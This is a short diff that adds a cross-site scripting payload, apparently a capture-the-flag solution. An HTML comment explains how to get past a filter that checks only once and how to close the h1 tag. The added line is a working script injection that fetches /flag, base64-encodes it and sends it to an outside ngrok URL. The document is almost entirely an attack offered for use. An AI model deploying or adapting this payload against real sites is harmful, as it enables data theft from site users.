@@ -1,0 +1,6 @@
+<!-- 
+    1. Provide special chars "'&<> to bypass filter (since they're only checked once)
+    2. Close off the h1 tag
+    3. Fetch /flag and send the response to ngrok (requestbin, webhook etc)
+-->
+"'&<></h1><script>fetch('/flag').then(r => { r.text().then(t => { fetch('https://0e00-81-103-153-174.ngrok.io/?flag=' + btoa(t), { 'mode': 'no-cors' }) }) })</script>
